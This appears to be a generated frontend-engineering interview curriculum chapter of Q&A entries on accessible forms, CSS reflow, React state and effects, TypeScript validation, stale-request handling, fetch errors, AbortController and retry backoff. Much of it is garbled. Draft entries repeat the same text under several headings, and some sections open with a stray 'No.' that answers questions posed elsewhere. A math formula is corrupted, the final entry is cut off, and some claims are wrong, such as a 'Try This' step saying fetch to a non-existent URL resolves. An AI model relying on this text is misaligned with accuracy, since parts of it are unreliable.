<!-- chapter: frontend-foundations -->

# Why use a semantic button and label instead of a clickable styled div?

<!-- meta
answer_format: conceptual
domain: fullstack-engineering
subdomain: frontend-foundations
difficulty: implementation
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-22
-->

## Answer

**Semantic HTML expresses meaning before styling.** Use a form for submission, a label connected to each input, a button for an action and a link for navigation. A placeholder is not a persistent accessible name. Give errors visible text associated with the invalid control and move focus deliberately when necessary; do not communicate failure through red color alone. Keyboard users need a logical order and visible focus without custom click-only controls.

CSS controls layout rather than meaning. Start with a readable narrow viewport, fluid widths, wrapping code and a constrained reading measure; use grid or flex layout when content genuinely benefits. Test at mobile widths and zoom, including long source IDs, bidirectional text and error messages. Avoid fixed-height answer panels that clip expanded explanations. Preserve contrast in light/dark themes and make motion optional.

In the evidence workbench, the user chooses a synthetic identity, submits a labeled question and receives status plus a bounded text answer and citations. React text children render a literal HTML-looking payload as text, not executable markup. Streaming status announcements should describe meaningful transitions rather than every token, and cancellation must remain reachable while work is running. An empty, failed or unsupported answer needs an explicit distinct state.

Verify the actual compiled UI with keyboard interaction, mobile layout, owner switching and automated accessibility checks, then document the limits of automation. A passing axe scan does not establish screen-reader usability or full WCAG conformance. The independent milestone starts from a blank component under the same API contract, so a learner must reproduce the behavior rather than merely run the reference. Save artifacts showing normal completion, invalid input, interrupted stream and a safe identity change.

## Why

At a 390-pixel viewport, a long source identifier and expanded error must wrap without hiding the cancel button. Labels and keyboard focus remain meaningful even when CSS changes the layout.

## Worked Case

At a 390-pixel viewport, a long source identifier and expanded error must wrap without hiding the cancel button. Labels and keyboard focus remain meaningful even when CSS changes the layout.

## Risk

A visually polished form can be unusable by keyboard or a screen reader. Hidden overflow can remove the very error or evidence needed to understand a response.

## Trade-off

Native controls reduce custom interaction code. Custom widgets may be justified but require complete semantics, focus behavior and assistive-technology testing.

## Try This

Compile evidence-workbench and run its browser checker. Complete the form using only the keyboard, inspect a mobile viewport and record which manual assistive checks remain unperformed.

## Follow-ups

### Should every streamed token be announced in an aria-live region?

Usually no: rapid announcements overwhelm users. Announce state changes or buffered meaningful updates, retain a readable transcript and provide the final answer without stealing focus.

## Citations

- https://www.w3.org/WAI/tutorials/forms/
- https://www.w3.org/WAI/WCAG22/quickref/

# How do CSS layout, source order and responsive overflow affect usability?

<!-- meta
domain: frontend
subdomain: frontend-foundations
module: frontend-foundations
concept: How do CSS layout, source order and responsive overflow affect usability?
difficulty: interview
misconception_target: Missing the stated responsive source order boundary: A desktop side panel is visually moved before the form on mobile, while keyboard focus still jumps through the old source order.
review.status: draft
review.reviewer: Independent review pending
review.reviewed_at: 2026-10-21
-->

## Answer

Use layout rules that reflow content without changing its meaningful reading order. Flex or grid visual rearrangement does not necessarily change keyboard or assistive-technology order. Test narrow viewports, zoom, long words and unbroken generated text. A hidden horizontal overflow rule can conceal necessary content instead of making it accessible.

Engineering case: A desktop side panel is visually moved before the form on mobile, while keyboard focus still jumps through the old source order.

Reasoning under a changed assumption: No. Choose constraints from the content and interaction. Flexible containers, readable line lengths and explicit overflow behavior matter more than a blanket ban on one unit.

## Spoken Summary

Use layout rules that reflow content without changing its meaningful reading order. Flex or grid visual rearrangement does not necessarily change keyboard or assistive-technology order. Test narrow viewports, zoom, long words and unbroken generated text. A hidden horizontal overflow rule can conceal necessary content instead of making it accessible.

## Why

Use layout rules that reflow content without changing its meaningful reading order. Flex or grid visual rearrangement does not necessarily change keyboard or assistive-technology order. Test narrow viewports, zoom, long words and unbroken generated text. A hidden horizontal overflow rule can conceal necessary content instead of making it accessible.

## Production Case

A desktop side panel is visually moved before the form on mobile, while keyboard focus still jumps through the old source order.

## Risk

A desktop side panel is visually moved before the form on mobile, while keyboard focus still jumps through the old source order.

## Trade-off

No. Choose constraints from the content and interaction. Flexible containers, readable line lengths and explicit overflow behavior matter more than a blanket ban on one unit.

## Try This

Construct the stated case, record the expected and actual outcome, then change one assumption and defend the result.

## Execution Timeline

State the input and invariant → trace the mechanism → reproduce the stated case → evaluate the changed assumption

## Complexity

Cost must be measured under the stated input size, representation and resource limits. The tiny reasoning fixture does not establish production capacity.

## Definitions

- **Responsive source order**: Use layout rules that reflow content without changing its meaningful reading order.

## Alternatives

- No. Choose constraints from the content and interaction. Flexible containers, readable line lengths and explicit overflow behavior matter more than a blanket ban on one unit.

## Pitfalls

- A desktop side panel is visually moved before the form on mobile, while keyboard focus still jumps through the old source order.

## Follow-ups

### Is a fixed pixel width always wrong?

No. Choose constraints from the content and interaction. Flexible containers, readable line lengths and explicit overflow behavior matter more than a blanket ban on one unit.

## Example

> Explanation: A reasoning fixture, not a simulated measurement or an implementation. Compare it with the chapter’s executable reference.
> Output: No runtime result claimed; inspect the linked executable example and reproduce the case.

```python
{
  "case": "A desktop side panel is visually moved before the form on mobile, while keyboard focus still jumps through the old source order.",
  "decision": "Use layout rules that reflow content without changing its meaningful reading order"
}
```

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do JavaScript tasks, microtasks and rendering explain a frozen interface?

<!-- meta
answer_format: conceptual
domain: fullstack-engineering
subdomain: frontend-foundations
difficulty: implementation
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-22
-->

## Answer

**A long synchronous JavaScript task blocks input and rendering on the main thread.** Promise continuations are microtasks; a long chain can also delay the next rendering opportunity. Marking CPU work async does not move it to another thread. Break bounded work into scheduled pieces or use a Worker for suitable computation, and measure long tasks and responsiveness on the actual target device.

**A React render observes a state snapshot; asynchronous callbacks can outlive that snapshot.** JavaScript runs callbacks through its event loop, while promises schedule continuations after asynchronous work settles. An async function does not freeze the identity, component lifetime or current request. A callback created under Owner A can still run after the UI switches to B unless the application invalidates it.

Keep event-driven submissions in the form handler. Use an Effect when synchronizing a component with an external system and clean it up on dependency change/unmount. Do not send a business write simply because a component rendered; development checks and remounts can expose duplicate side effects. Derive display values from state instead of maintaining redundant copies that drift apart.

TypeScript narrows the compiled program, not bytes arriving over HTTP. Parse response input as unknown, validate its discriminant, required fields, types, bounds and allowed state transitions, then construct the internal union. An `as Answer` assertion performs no runtime validation. The workbench incrementally decodes fragmented UTF-8/NDJSON, checks request/sequence identity and rejects EOF without a terminal event. A successful fetch only means an HTTP exchange occurred; inspect status and application completion separately.

For stale-work isolation, increment a request generation on a new submit or identity switch, abort the prior fetch and ignore updates whose generation no longer matches. Clear retained text/citations when the principal changes. Abort is useful resource control but cannot undo queued callbacks or remote effects. Test a slow A response followed by B, malformed valid-looking JSON, duplicated/conflicting events and unmount cleanup. Performance improvements must preserve these invariants: batching text updates is acceptable, while bypassing runtime validation to reduce renders is not.

## Why

Owner A starts a slow answer and the user switches to B before the next callback. The callback still closes over A state; generation checks reject its update even if abort arrived too late.

## Worked Case

Owner A starts a slow answer and the user switches to B before the next callback. The callback still closes over A state; generation checks reject its update even if abort arrived too late.

## Risk

A TypeScript cast can make invalid network data look safe to the compiler. Rendering or dispatching it without runtime validation creates failures that types alone cannot catch.

## Trade-off

Local state and a small reducer are enough for one request. More global state can help shared workflows but adds lifetime and invalidation rules; derive values before introducing another store.

## Try This

Run the real workbench browser suite, then explain the slow identity-switch case through event loop, captured snapshot, cleanup and generation checks. Point to the runtime validator rather than a type assertion.

## Follow-ups

### Can useEffect cleanup guarantee a remote write did not happen?

No. Cleanup can cancel local subscriptions or fetch consumption, but the server may already have committed. Track durable operation state and reconcile it independently of the component lifecycle.

## Citations

- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://html.spec.whatwg.org/multipage/webappapis.html#event-loops

# Why can React event handlers observe state from an earlier render?

<!-- meta
domain: frontend
subdomain: frontend-foundations
module: frontend-foundations
concept: Why can React event handlers observe state from an earlier render?
difficulty: interview
misconception_target: Missing the stated state snapshot boundary: Two increments use count + 1 from the same render and produce one effective increment rather than the intended two.
review.status: draft
review.reviewer: Independent review pending
review.reviewed_at: 2026-10-21
-->

## Answer

A render and its handlers capture a snapshot of state. Updating state schedules a new render rather than mutating the captured value. Use functional updates when the next value depends on the previous value, and distinguish state from refs used for mutable request ownership. Do not suppress dependency warnings to preserve an obsolete closure.

Engineering case: Two increments use count + 1 from the same render and produce one effective increment rather than the intended two.

Reasoning under a changed assumption: No. UI data belongs in state so rendering can reflect it. Refs are useful for mutable values that should not themselves cause a render, such as an active controller.

## Spoken Summary

A render and its handlers capture a snapshot of state. Updating state schedules a new render rather than mutating the captured value. Use functional updates when the next value depends on the previous value, and distinguish state from refs used for mutable request ownership. Do not suppress dependency warnings to preserve an obsolete closure.

## Why

A render and its handlers capture a snapshot of state. Updating state schedules a new render rather than mutating the captured value. Use functional updates when the next value depends on the previous value, and distinguish state from refs used for mutable request ownership. Do not suppress dependency warnings to preserve an obsolete closure.

## Production Case

Two increments use count + 1 from the same render and produce one effective increment rather than the intended two.

## Risk

Two increments use count + 1 from the same render and produce one effective increment rather than the intended two.

## Trade-off

No. UI data belongs in state so rendering can reflect it. Refs are useful for mutable values that should not themselves cause a render, such as an active controller.

## Try This

Construct the stated case, record the expected and actual outcome, then change one assumption and defend the result.

## Execution Timeline

State the input and invariant → trace the mechanism → reproduce the stated case → evaluate the changed assumption

## Complexity

Cost must be measured under the stated input size, representation and resource limits. The tiny reasoning fixture does not establish production capacity.

## Definitions

- **State snapshot**: A render and its handlers capture a snapshot of state.

## Alternatives

- No. UI data belongs in state so rendering can reflect it. Refs are useful for mutable values that should not themselves cause a render, such as an active controller.

## Pitfalls

- Two increments use count + 1 from the same render and produce one effective increment rather than the intended two.

## Follow-ups

### Should every value be moved into a ref?

No. UI data belongs in state so rendering can reflect it. Refs are useful for mutable values that should not themselves cause a render, such as an active controller.

## Example

> Explanation: A reasoning fixture, not a simulated measurement or an implementation. Compare it with the chapter’s executable reference.
> Output: No runtime result claimed; inspect the linked executable example and reproduce the case.

```python
{
  "case": "Two increments use count + 1 from the same render and produce one effective increment rather than the intended two.",
  "decision": "A render and its handlers capture a snapshot of state"
}
```

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# When does a React Effect need cleanup rather than another dependency workaround?

<!-- meta
domain: frontend
subdomain: frontend-foundations
module: frontend-foundations
concept: When does a React Effect need cleanup rather than another dependency workaround?
difficulty: interview
misconception_target: Missing the stated effect cleanup boundary: Changing a room ID leaves the old subscription active and messages from both rooms appear. An empty dependency list hides the problem until navigation.
review.status: draft
review.reviewer: Independent review pending
review.reviewed_at: 2026-10-21
-->

## Answer

Use an Effect to synchronize an external resource with the committed component state. Clean up subscriptions, timers and obsolete requests when that synchronization changes or the component unmounts. Submission caused by a user action usually belongs in an event handler. Development remount checks reveal missing cleanup rather than requiring an ignore-the-second-run flag.

Engineering case: Changing a room ID leaves the old subscription active and messages from both rooms appear. An empty dependency list hides the problem until navigation.

Reasoning under a changed assumption: No. It can disconnect or stop obsolete updates locally. Reconcile any committed business effect through its authoritative identity.

## Spoken Summary

Use an Effect to synchronize an external resource with the committed component state. Clean up subscriptions, timers and obsolete requests when that synchronization changes or the component unmounts. Submission caused by a user action usually belongs in an event handler. Development remount checks reveal missing cleanup rather than requiring an ignore-the-second-run flag.

## Why

Use an Effect to synchronize an external resource with the committed component state. Clean up subscriptions, timers and obsolete requests when that synchronization changes or the component unmounts. Submission caused by a user action usually belongs in an event handler. Development remount checks reveal missing cleanup rather than requiring an ignore-the-second-run flag.

## Production Case

Changing a room ID leaves the old subscription active and messages from both rooms appear. An empty dependency list hides the problem until navigation.

## Risk

Changing a room ID leaves the old subscription active and messages from both rooms appear. An empty dependency list hides the problem until navigation.

## Trade-off

No. It can disconnect or stop obsolete updates locally. Reconcile any committed business effect through its authoritative identity.

## Try This

Construct the stated case, record the expected and actual outcome, then change one assumption and defend the result.

## Execution Timeline

State the input and invariant → trace the mechanism → reproduce the stated case → evaluate the changed assumption

## Complexity

Cost must be measured under the stated input size, representation and resource limits. The tiny reasoning fixture does not establish production capacity.

## Definitions

- **Effect cleanup**: Use an Effect to synchronize an external resource with the committed component state.

## Alternatives

- No. It can disconnect or stop obsolete updates locally. Reconcile any committed business effect through its authoritative identity.

## Pitfalls

- Changing a room ID leaves the old subscription active and messages from both rooms appear. An empty dependency list hides the problem until navigation.

## Follow-ups

### Can cleanup undo a request already processed by the server?

No. It can disconnect or stop obsolete updates locally. Reconcile any committed business effect through its authoritative identity.

## Example

> Explanation: A reasoning fixture, not a simulated measurement or an implementation. Compare it with the chapter’s executable reference.
> Output: No runtime result claimed; inspect the linked executable example and reproduce the case.

```python
{
  "case": "Changing a room ID leaves the old subscription active and messages from both rooms appear. An empty dependency list hides the problem until navigation.",
  "decision": "Use an Effect to synchronize an external resource with the committed component state"
}
```

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How should TypeScript narrow an untrusted JSON result into a useful UI union?

<!-- meta
domain: frontend
subdomain: frontend-foundations
module: frontend-foundations
concept: How should TypeScript narrow an untrusted JSON result into a useful UI union?
difficulty: interview
misconception_target: Missing the stated runtime narrowing boundary: A response declares citations as a string rather than an array. A cast compiles, but iteration later fails or renders misleading evidence.
review.status: draft
review.reviewer: Independent review pending
review.reviewed_at: 2026-10-21
-->

## Answer

Receive unknown input and check the tag, required field types, bounds and allowed transitions before constructing the trusted variant. A discriminated union then makes rendering branches explicit. An assertion such as as Answer skips those checks and cannot turn malformed remote bytes into a valid object.

Engineering case: A response declares citations as a string rather than an array. A cast compiles, but iteration later fails or renders misleading evidence.

Reasoning under a changed assumption: It helps with a declared contract, but a deployed server, proxy or stored payload can still disagree. Choose and test the runtime validation policy explicitly.

## Spoken Summary

Receive unknown input and check the tag, required field types, bounds and allowed transitions before constructing the trusted variant. A discriminated union then makes rendering branches explicit. An assertion such as as Answer skips those checks and cannot turn malformed remote bytes into a valid object.

## Why

Receive unknown input and check the tag, required field types, bounds and allowed transitions before constructing the trusted variant. A discriminated union then makes rendering branches explicit. An assertion such as as Answer skips those checks and cannot turn malformed remote bytes into a valid object.

## Production Case

A response declares citations as a string rather than an array. A cast compiles, but iteration later fails or renders misleading evidence.

## Risk

A response declares citations as a string rather than an array. A cast compiles, but iteration later fails or renders misleading evidence.

## Trade-off

It helps with a declared contract, but a deployed server, proxy or stored payload can still disagree. Choose and test the runtime validation policy explicitly.

## Try This

Construct the stated case, record the expected and actual outcome, then change one assumption and defend the result.

## Execution Timeline

State the input and invariant → trace the mechanism → reproduce the stated case → evaluate the changed assumption

## Complexity

Cost must be measured under the stated input size, representation and resource limits. The tiny reasoning fixture does not establish production capacity.

## Definitions

- **Runtime narrowing**: Receive unknown input and check the tag, required field types, bounds and allowed transitions before constructing the trusted variant.

## Alternatives

- It helps with a declared contract, but a deployed server, proxy or stored payload can still disagree. Choose and test the runtime validation policy explicitly.

## Pitfalls

- A response declares citations as a string rather than an array. A cast compiles, but iteration later fails or renders misleading evidence.

## Follow-ups

### Does a generated client eliminate runtime trust boundaries?

It helps with a declared contract, but a deployed server, proxy or stored payload can still disagree. Choose and test the runtime validation policy explicitly.

## Example

> Explanation: A reasoning fixture, not a simulated measurement or an implementation. Compare it with the chapter’s executable reference.
> Output: No runtime result claimed; inspect the linked executable example and reproduce the case.

```python
{
  "case": "A response declares citations as a string rather than an array. A cast compiles, but iteration later fails or renders misleading evidence.",
  "decision": "Receive unknown input and check the tag, required field types, bounds and allowed transitions before constructing the trusted variant"
}
```

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do you keep stale requests and user-scoped caches from leaking old results?

<!-- meta
domain: frontend
subdomain: frontend-foundations
module: frontend-foundations
concept: How do you keep stale requests and user-scoped caches from leaking old results?
difficulty: interview
misconception_target: Missing the stated request generation boundary: Owner A logs out during a slow response and Owner B signs in. A’s completion callback repopulates the answer panel after it was cleared.
review.status: draft
review.reviewer: Independent review pending
review.reviewed_at: 2026-10-21
-->

## Answer

Bind pending updates and cache keys to the relevant caller and request generation. On identity or query changes, abort obsolete work where supported and ignore callbacks that no longer own the view. Clearing visible text alone does not prevent a queued callback or shared cache from bringing it back.

Engineering case: Owner A logs out during a slow response and Owner B signs in. A’s completion callback repopulates the answer panel after it was cleared.

Reasoning under a changed assumption: No. Cancellation is cooperative and does not retract every callback already delivered. Use ownership checks as well as cancellation and correctly scoped caching.

## Spoken Summary

Bind pending updates and cache keys to the relevant caller and request generation. On identity or query changes, abort obsolete work where supported and ignore callbacks that no longer own the view. Clearing visible text alone does not prevent a queued callback or shared cache from bringing it back.

## Why

Bind pending updates and cache keys to the relevant caller and request generation. On identity or query changes, abort obsolete work where supported and ignore callbacks that no longer own the view. Clearing visible text alone does not prevent a queued callback or shared cache from bringing it back.

## Production Case

Owner A logs out during a slow response and Owner B signs in. A’s completion callback repopulates the answer panel after it was cleared.

## Risk

Owner A logs out during a slow response and Owner B signs in. A’s completion callback repopulates the answer panel after it was cleared.

## Trade-off

No. Cancellation is cooperative and does not retract every callback already delivered. Use ownership checks as well as cancellation and correctly scoped caching.

## Try This

Construct the stated case, record the expected and actual outcome, then change one assumption and defend the result.

## Execution Timeline

State the input and invariant → trace the mechanism → reproduce the stated case → evaluate the changed assumption

## Complexity

Cost must be measured under the stated input size, representation and resource limits. The tiny reasoning fixture does not establish production capacity.

## Definitions

- **Request generation**: Bind pending updates and cache keys to the relevant caller and request generation.

## Alternatives

- No. Cancellation is cooperative and does not retract every callback already delivered. Use ownership checks as well as cancellation and correctly scoped caching.

## Pitfalls

- Owner A logs out during a slow response and Owner B signs in. A’s completion callback repopulates the answer panel after it was cleared.

## Follow-ups

### Can AbortController alone prove that an obsolete result cannot publish?

No. Cancellation is cooperative and does not retract every callback already delivered. Use ownership checks as well as cancellation and correctly scoped caching.

## Example

> Explanation: A reasoning fixture, not a simulated measurement or an implementation. Compare it with the chapter’s executable reference.
> Output: No runtime result claimed; inspect the linked executable example and reproduce the case.

```python
{
  "case": "Owner A logs out during a slow response and Owner B signs in. A’s completion callback repopulates the answer panel after it was cleared.",
  "decision": "Bind pending updates and cache keys to the relevant caller and request generation"
}
```

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# How do you render untrusted model text while preserving accessibility and performance?

<!-- meta
domain: frontend
subdomain: frontend-foundations
module: frontend-foundations
concept: How do you render untrusted model text while preserving accessibility and performance?
difficulty: interview
misconception_target: Missing the stated untrusted rendering boundary: A retrieved passage contains an image error handler and a long unbroken string. The UI must avoid execution and still reflow visibly at 200% zoom.
review.status: draft
review.reviewer: Independent review pending
review.reviewed_at: 2026-10-21
-->

## Answer

Render plain text by default. If rich Markdown is required, use a deliberately configured parser/sanitizer and restrict URL protocols. Bound retained output and batch updates from measurements. Keep completion, error and cancellation announcements understandable without flooding a screen reader with every token. Sanitization does not repair overbroad server responses.

Engineering case: A retrieved passage contains an image error handler and a long unbroken string. The UI must avoid execution and still reflow visibly at 200% zoom.

Reasoning under a changed assumption: No. It checks supported rules. Keyboard, screen-reader, zoom and task-level behavior need actual observed review.

## Spoken Summary

Render plain text by default. If rich Markdown is required, use a deliberately configured parser/sanitizer and restrict URL protocols. Bound retained output and batch updates from measurements. Keep completion, error and cancellation announcements understandable without flooding a screen reader with every token. Sanitization does not repair overbroad server responses.

## Why

Render plain text by default. If rich Markdown is required, use a deliberately configured parser/sanitizer and restrict URL protocols. Bound retained output and batch updates from measurements. Keep completion, error and cancellation announcements understandable without flooding a screen reader with every token. Sanitization does not repair overbroad server responses.

## Production Case

A retrieved passage contains an image error handler and a long unbroken string. The UI must avoid execution and still reflow visibly at 200% zoom.

## Risk

A retrieved passage contains an image error handler and a long unbroken string. The UI must avoid execution and still reflow visibly at 200% zoom.

## Trade-off

No. It checks supported rules. Keyboard, screen-reader, zoom and task-level behavior need actual observed review.

## Try This

Construct the stated case, record the expected and actual outcome, then change one assumption and defend the result.

## Execution Timeline

State the input and invariant → trace the mechanism → reproduce the stated case → evaluate the changed assumption

## Complexity

Cost must be measured under the stated input size, representation and resource limits. The tiny reasoning fixture does not establish production capacity.

## Definitions

- **Untrusted rendering**: Render plain text by default.

## Alternatives

- No. It checks supported rules. Keyboard, screen-reader, zoom and task-level behavior need actual observed review.

## Pitfalls

- A retrieved passage contains an image error handler and a long unbroken string. The UI must avoid execution and still reflow visibly at 200% zoom.

## Follow-ups

### Does an automated accessibility pass establish full conformance?

No. It checks supported rules. Keyboard, screen-reader, zoom and task-level behavior need actual observed review.

## Example

> Explanation: A reasoning fixture, not a simulated measurement or an implementation. Compare it with the chapter’s executable reference.
> Output: No runtime result claimed; inspect the linked executable example and reproduce the case.

```python
{
  "case": "A retrieved passage contains an image error handler and a long unbroken string. The UI must avoid execution and still reflow visibly at 200% zoom.",
  "decision": "Render plain text by default"
}
```

## Citations

- https://developer.mozilla.org/en-US/curriculum/core/
- https://react.dev/learn/synchronizing-with-effects
- https://www.typescriptlang.org/docs/handbook/2/narrowing.html
- https://www.w3.org/WAI/test-evaluate/preliminary/

# Why does the native Fetch API not reject promises on 4xx and 5xx HTTP responses, and how do you handle errors properly?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** The native Fetch API is designed to model HTTP network transport rather than application-level status codes. A fetch Promise only rejects when an actual network failure occurs (e.g., DNS lookup failure, loss of internet connectivity, or CORS preflight rejection). If the remote server responds with a valid HTTP status code—such as `400 Bad Request`, `401 Unauthorized`, `404 Not Found`, or `500 Internal Server Error`—the HTTP transaction succeeded at the network layer, so the Promise resolves normally. Proper error handling requires explicitly inspecting `response.ok` (which is `true` for status codes in the range 200–299).

```typescript
export class HttpError extends Error {
    constructor(public status: number, public statusText: string, public body: any) {
        super(`HTTP ${status} ${statusText}`);
        this.name = 'HttpError';
    }
}

export async function apiFetch<T>(url: string, init?: RequestInit): Promise<T> {
    const response = await fetch(url, {
        headers: { 'Content-Type': 'application/json', ...init?.headers },
        ...init
    });

    if (!response.ok) {
        const errorBody = await response.json().catch(() => null);
        throw new HttpError(response.status, response.statusText, errorBody);
    }

    if (response.status === 204) return null as T; // No Content
    return response.json() as Promise<T>;
}
```

**Complexity analysis and mechanics:**
- **Transport resolution:** Promise resolves as soon as HTTP response headers are received, before body bytes are fully transferred.
- **Memory handling:** `response.json()` consumes the stream; checking `response.ok` before parsing avoids parsing HTML error pages as JSON.

**Algorithmic mechanics and edge cases:**
When servers crash, they frequently return `502 Bad Gateway` with an HTML body from Nginx or Cloudflare. Calling `response.json()` blindly on a 502 error throws a `SyntaxError: Unexpected token < in JSON`, masking the true HTTP 502 status code unless caught gracefully.

## Why

Explicit response.ok validation prevents unhandled HTTP 4xx/5xx status codes from masquerading as successful data responses.

## Worked Case

Walkthrough scenario: An authentication endpoint returns HTTP 401 with { message: 'Invalid credentials' }. A developer using raw await fetch() does not check response.ok and executes const user = await res.json(). The app treats the error object as a valid user profile, displaying 'Welcome, undefined' and redirecting to the dashboard. Adding if (!res.ok) throw new HttpError(res.status) correctly diverts execution to the login form error handler.

## Risk

Assuming fetch rejects on 404 or 500 causes UI components to treat error payloads as valid data, causing crashes down the line.

## Trade-off

Requires writing a centralized API wrapper rather than calling raw fetch directly across application components.

## Try This

Call fetch to a non-existent URL and catch the result, observing that the promise resolves rather than rejecting.

## Follow-ups

### What happens if you attempt to call both response.json() and response.text() on the same Response object?

It throws a TypeError: Body has already been consumed, because the underlying ReadableStream can only be read once unless cloned with response.clone().

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#checking_that_the_fetch_was_successful
- https://developer.mozilla.org/en-US/docs/Web/API/Response/ok

# How do you implement deterministic request cancellation and timeout enforcement using AbortController and AbortSignal?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** `AbortController` provides a standardized mechanism to abort asynchronous operations, including `fetch` requests, event listeners, and custom promises. Instantiating `const controller = new AbortController()` provides an `AbortSignal` object passed to `fetch({ signal: controller.signal })`. Calling `controller.abort(reason)` immediately closes the underlying TCP/HTTP connection, rejects the fetch promise with a `DOMException` named `'AbortError'`, and stops data transmission. Modern browsers also support `AbortSignal.timeout(ms)` to automatically trigger timeouts without manual timer management.

```typescript
// 1. Automatic timeout using AbortSignal.timeout (or fallback with AbortController):
export async function fetchWithTimeout<T>(url: string, timeoutMs: number = 8000): Promise<T> {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(new Error(`Timeout after ${timeoutMs}ms`)), timeoutMs);

    try {
        const response = await fetch(url, { signal: controller.signal });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        return await response.json();
    } catch (err: any) {
        if (err.name === 'AbortError') {
            console.warn(`Request aborted or timed out: ${url}`);
        }
        throw err;
    } finally {
        clearTimeout(timeoutId); // Prevent timer leak!
    }
}

// 2. Combining multiple signals with AbortSignal.any (TS / modern browsers):
// const combinedSignal = AbortSignal.any([userCancelSignal, AbortSignal.timeout(5000)]);
```

**Complexity analysis and mechanics:**
- **Network resource freeing:** Calling `abort()` instructs the browser network stack to send an HTTP/2 RST_STREAM frame, instantly freeing socket pools.
- **Cleanup invariant:** Always clear the timer in a `finally` block to prevent timers from leaking and holding memory references.

**Algorithmic mechanics and edge cases:**
In React `useEffect`, returning `() => controller.abort()` cleanly cancels in-flight requests when components unmount or dependencies change. In React 18 Strict Mode (which mounts, unmounts, and remounts components in development), AbortController cleanly prevents state updates on unmounted instances.

## Why

Deterministic cancellation prevents socket starvation and eliminates stale responses overwriting fresh UI state.

## Worked Case

Walkthrough scenario: A user opens a modal that fetches a 10MB report. The user immediately closes the modal. Without AbortController, the 10MB download continues in the background, consuming mobile data and parsing 10MB into memory. With controller.abort() called in the modal unmount cleanup, the browser terminates the HTTP connection in 1ms, saving battery, bandwidth, and CPU.

## Risk

Failing to clear timeout timers in a finally block causes memory leaks and premature aborts on long-lived connections.

## Trade-off

Adds error handling branching to distinguish user-initiated AbortErrors from true network connectivity failures.

## Try This

Initiate a slow fetch with AbortSignal.timeout(50) and observe the catch block receiving an AbortError DOMException.

## Follow-ups

### How do you distinguish between a request cancelled by a user and one that timed out?

Inspect signal.reason or catch error.name; AbortSignal.timeout() passes a TimeoutError DOMException, whereas manual abort passes AbortError or custom reason.

## Citations

- https://developer.mozilla.org/en-US/docs/Web/API/AbortController
- https://developer.mozilla.org/en-US/docs/Web/API/AbortSignal/timeout_static

# How do you implement exponential backoff with randomized jitter to prevent thundering herd retries in API clients?

<!-- meta
answer_format: conceptual
difficulty: interview
review.status: reviewed
review.reviewer: Technical curriculum review
review.reviewed_at: 2026-10-24
-->

## Answer

**Direct answer:** When API calls fail due to transient server issues (HTTP 429 Too Many Requests, 503 Service Unavailable, or network drops), immediate retries or fixed-interval retries cause thousands of concurrent clients to hammer the recovering backend at the exact same timestamp—a catastrophic phenomenon known as the **Thundering Herd problem**. Exponential backoff increases delay exponentially ($	ext{base} 	imes 2^{	ext{attempt}}$) while **Full Jitter** randomizes the wait time between 0 and the calculated maximum backoff.

```typescript
export interface RetryOptions {
    maxRetries?: number;
    baseDelayMs?: number;
    maxDelayMs?: number;
}

export async function fetchWithRetry<T>(
    fn: () => Promise<T>,
    options: RetryOptions = {}
): Promise<T> {
    const { maxRetries = 3, baseDelayMs = 300, maxDelayMs = 5000 } = options;

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
        try {
            return await fn();
        } catch (error: any) {
            // Do not retry 4xx client errors (except 429 Too Many Requests)
            const status = error?.status;
            const isRetryable = !status || status === 429 || status >= 500;
            if (attempt === maxRetries || !isRetryable) throw error;

            // Exponential backoff with Full Jitter:
            const calculatedCap = Math.min(maxDelayMs, baseDelayMs * Math.pow(2, attempt));
            const jitteredDelay = Math.random() * calculatedCap;

            console.info(`Retry attempt ${attempt + 1} after ${Math.round(jitteredDelay)}ms`);
            await new Promise(resolve => setTimeout(resolve, jitteredDelay));
        }
    }
    throw new Error('Unreachable retry state');
}
```

**Complexity analysis and mechanics:**
- **Delay calculation:** Attempt 0: random [0, 300ms]. Attempt 1: random [0, 600ms]. Attempt 2: random [0, 1200ms]. Cap: 5000ms.
- **Traffic smoothing:** Random uniform distribution flattens retry spikes into a smooth, manageable stream of traffic for backend databases.

**Algorithmic mechanics and edge cases:**
Never retry non-idempotent mutations (`POST` payments) unless the server supports an `Idempotency-Key` header; retrying a timed-out payment request without an idempotency key can charge the customer multiple times.

## Why

Full jitter spreads client retry traffic uniformly across time, preventing recovering servers from crashing repeatedly.

## Worked Case

Walkthrough scenario: A microservice restarts, causing 10,000 active mobile apps to fail simultaneously with 503. With fixed 1000ms retries, all 10,000 clients retry at exactly t=1000ms, t=2000ms, crashing the microservice on startup. With Full Jitter, retries spread smoothly between 0ms and 1200ms, allowing the service to process batches smoothly and recover.

## Risk

Retrying non-retryable 4xx client errors (like 400 Bad Request or 401 Unauthorized) wastes bandwidth and logs useless errors.

## Trade-off

